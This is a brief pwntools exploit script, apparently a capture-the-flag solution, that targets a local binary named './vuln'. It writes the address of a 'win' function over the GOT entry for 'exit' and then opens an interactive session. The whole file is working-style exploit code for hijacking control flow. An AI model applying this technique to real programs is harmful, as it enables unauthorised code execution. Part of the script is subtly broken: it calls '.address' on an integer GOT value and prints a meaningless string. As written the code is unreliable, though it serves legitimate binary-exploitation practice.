# call exit 0x08048669
# call win 0x0804854b
from pwn import *

context.binary = "./vuln"

p = process()
print("aaaaaaaaaaaaaa")
print((context.binary.got["exit"].address))
p.sendline(str(context.binary.got["exit"]))
p.sendline(str(context.binary.functions["win"].address))
p.interactive()
